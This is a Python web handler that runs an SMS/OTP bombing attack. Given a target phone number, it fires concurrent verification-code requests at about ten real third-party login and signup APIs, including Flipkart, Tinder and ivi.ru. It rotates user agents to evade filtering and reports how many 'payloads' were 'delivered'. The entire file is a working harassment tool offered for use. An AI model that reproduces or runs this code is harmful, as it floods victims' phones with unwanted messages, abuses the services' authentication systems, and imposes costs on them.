from http.server import BaseHTTPRequestHandler
import json
import urllib.request
import urllib.parse
from urllib.error import URLError, HTTPError
import asyncio

# OTP endpoints parsed from TBomb multi list
ENDPOINTS = [
    {"url": "https://www.flipkart.com/api/5/user/otp/generate", "method": "POST", "payload": {"loginId": "+{TARGET}"}},
    {"url": "https://qlean.ru/clients-api/v2/sms_codes/auth/request_code", "method": "POST", "payload": {"phone": "1{TARGET}"}},
    {"url": "https://api.gotinder.com/v2/auth/sms/send?auth_type=sms&locale=en", "method": "POST", "payload": {"phone_number": "1{TARGET}"}},
    {"url": "https://youla.ru/web-api/auth/request_code", "method": "POST", "payload": {"phone": "+1{TARGET}"}},
    {"url": "https://api.ivi.ru/mobileapi/user/register/phone/v6", "method": "POST", "payload": {"phone": "1{TARGET}"}},
    {"url": "https://api.delitime.ru/api/v2/signup", "method": "POST", "payload": {"SignupForm[username]": "1{TARGET}", "SignupForm[device_type]": "3"}},
    {"url": "https://www.icq.com/smsreg/requestPhoneValidation.php", "method": "POST", "payload": {"msisdn": "1{TARGET}", "locale": "en", "k": "ic1rtwz1s1Hj1O0r", "r": "45559"}},
    {"url": "https://api.ivi.ru/mobileapi/user/register/phone/v6/", "method": "POST", "payload": {"phone": "1{TARGET}", "device": "Windows+v.43+Chrome+v.7453451", "app_version": "870"}},
    {"url": "https://m.redbus.in/api/getOtp?number={TARGET}&cc=1&whatsAppOpted=false", "method": "GET", "payload": None},
    {"url": "https://my.newtonschool.co:443/api/v1/user/otp/?registration=true", "method": "POST", "payload": {"phone": "+1{TARGET}"}}
]

import random

USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/121.0",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Mobile/15E148 Safari/604.1"
]

async def send_otp_request(target, endpoint):
    try:
        url = endpoint["url"].replace("{TARGET}", target)
        method = endpoint["method"]
        data = None
        
        if method == "POST":
            payload_str = json.dumps(endpoint["payload"]).replace("{TARGET}", target)
            data = payload_str.encode('utf-8')
        
        req = urllib.request.Request(url, data=data, method=method)
        if method == "POST":
            req.add_header('Content-Type', 'application/json')
        
        req.add_header('User-Agent', random.choice(USER_AGENTS))
        req.add_header('Accept', '*/*')
        req.add_header('Connection', 'keep-alive')
        
        loop = asyncio.get_event_loop()
        # Taking the safeties off. We fire live requests here.
        def execute_request():
            with urllib.request.urlopen(req, timeout=5) as response:
                return response.getcode(), response.read().decode('utf-8', errors='ignore')
        
        status_code, body = await loop.run_in_executor(None, execute_request)
        return {"url": url, "status": "success", "code": status_code, "response": body}
    except HTTPError as e:
        error_body = e.read().decode('utf-8', errors='ignore')
        return {"url": endpoint["url"], "status": "failed", "code": e.code, "response": error_body}
    except Exception as e:
        return {"url": endpoint["url"], "status": "failed", "error": str(e)}

async def blast_target(target):
    tasks = []
    # Create multiple concurrent tasks per endpoint to simulate a flood
    for _ in range(3): 
        for endpoint in ENDPOINTS:
            tasks.append(send_otp_request(target, endpoint))
    
    results = await asyncio.gather(*tasks, return_exceptions=True)
    success_count = sum(1 for r in results if isinstance(r, dict) and r.get("status") == "success")
    return success_count, len(results), results

class handler(BaseHTTPRequestHandler):
    def do_OPTIONS(self):
        self.send_response(200)
        self.send_header('Access-Control-Allow-Origin', '*')
        self.send_header('Access-Control-Allow-Methods', 'POST, OPTIONS')
        self.send_header('Access-Control-Allow-Headers', 'Content-Type')
        self.end_headers()

    def do_POST(self):
        try:
            content_length = int(self.headers.get('Content-Length', 0))
            post_data = self.rfile.read(content_length)
            body = json.loads(post_data.decode('utf-8'))
            
            target = body.get('target')
            if not target:
                self.send_response(400)
                self.send_header('Content-type', 'application/json')
                self.send_header('Access-Control-Allow-Origin', '*')
                self.end_headers()
                self.wfile.write(json.dumps({'error': 'Target required'}).encode())
                return

            # Run the async bombing loop with a new event loop for serverless stability
            loop = asyncio.new_event_loop()
            asyncio.set_event_loop(loop)
            success_count, total_count, details = loop.run_until_complete(blast_target(target))
            loop.close()

            self.send_response(200)
            self.send_header('Content-type', 'application/json')
            self.send_header('Access-Control-Allow-Origin', '*')
            self.end_headers()
            
            resp_data = {
                'status': 'complete',
                'target': target,
                'requests_fired': total_count,
                'successful_hits': success_count,
                'message': f'OTP Flood complete. {success_count}/{total_count} payloads delivered.',
                'details': details
            }
            self.wfile.write(json.dumps(resp_data).encode())
            
        except Exception as e:
            self.send_response(500)
            self.send_header('Content-type', 'application/json')
            self.send_header('Access-Control-Allow-Origin', '*')
            self.end_headers()
            self.wfile.write(json.dumps({'error': str(e)}).encode())
